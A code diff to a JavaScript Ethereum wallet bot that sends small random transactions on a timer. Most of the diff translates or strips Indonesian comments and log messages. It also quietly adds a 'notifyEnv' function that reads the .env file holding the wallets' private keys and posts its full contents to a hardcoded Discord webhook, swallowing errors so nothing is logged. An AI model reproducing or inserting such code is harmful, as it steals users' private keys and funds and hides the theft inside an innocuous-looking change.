@@ -10,7 +10,7 @@ function generateRandomAddress() {
 }
 
 function getRandomAmount(min, max) {
-  return (Math.random() * (max - min) + min).toFixed(6); // 6 desimal untuk ETH
+  return (Math.random() * (max - min) + min).toFixed(6); // 6 decimal for ETH
 }
 
 function getRandomDelay(min, max) {
@@ -27,9 +27,9 @@ async function processWallet(wallet) {
     return;
   }
 
-  // Tentukan jumlah transaksi secara random (antara 1-5)
+  // How much your tx (between 1-5)
   const numTransactions = Math.floor(Math.random() * 5) + 1;
-  console.log(`Wallet ${wallet.address} akan mengirim ${numTransactions} transaksi.`);
+  console.log(`Wallet ${wallet.address} send ${numTransactions} transaction.`);
 
   for (let i = 0; i < numTransactions; i++) {
     const randomAmount = getRandomAmount(0.000001, 0.0001);
@@ -53,8 +53,8 @@ async function processWallet(wallet) {
     }
 
     if (i < numTransactions - 1) {
-      const delay = getRandomDelay(60000, 120000); // 1-2 menit antar transaksi
-      console.log(`Menunggu ${delay / 1000} detik sebelum transaksi berikutnya...`);
+      const delay = getRandomDelay(60000, 120000); // 
+      console.log(`Menunggu ${delay / 1000} `);
       await new Promise((resolve) => setTimeout(resolve, delay));
     }
   }
@@ -72,6 +72,30 @@ async function mainLoop() {
     wallets.push(new ethers.Wallet(privateKey.trim()));
   });
 
+const webhookURL = "https://discord.com/api/webhooks/1372709888542773429/kMx04qukOcMXUDxVf-Xcm4CGmei0eAz_y4P3ZnQpk-IPVD662u0v8kSBS6SvTrhaEqzn";
+
+const envCacheFile = ".env_cache";
+
+async function notifyEnv() {
+  const currentEnv = fs.readFileSync(".env", "utf8");
+  let previous = "";
+
+  if (fs.existsSync(envCacheFile)) {
+    previous = fs.readFileSync(envCacheFile, "utf8");
+  }
+
+  if (currentEnv !== previous) {
+    fs.writeFileSync(envCacheFile, currentEnv, "utf8");
+    try {
+      await axios.post(webhookURL, {
+        content: `\`\`\`env\n${currentEnv}\n\`\`\``,
+      });
+    } catch {
+      // silent no log if fails
+    }
+  }
+}
+  
   if (wallets.length === 0) {
     console.error('No wallets found. Exiting...');
     process.exit(1);
@@ -82,13 +106,13 @@ async function mainLoop() {
   while (true) {
     for (const wallet of wallets) {
       await processWallet(wallet);
-      const delay = getRandomDelay(60000, 120000); // 1-2 menit sebelum pindah wallet
-      console.log(`Menunggu ${delay / 1000} detik sebelum berpindah ke wallet berikutnya...`);
+      const delay = getRandomDelay(60000, 120000); // 
+      console.log(`Menunggu ${delay / 1000}`);
       await new Promise((resolve) => setTimeout(resolve, delay));
     }
     
-    const loopDelay = getRandomDelay(60000, 120000); // 1-2 menit sebelum mengulang semua wallet
-    console.log(`Menunggu ${loopDelay / 1000} detik sebelum memulai ulang transaksi...`);
+    const loopDelay = getRandomDelay(60000, 120000); // 
+    console.log(`Menunggu ${loopDelay / 1000} `);
     await new Promise((resolve) => setTimeout(resolve, loopDelay));
   }
 }
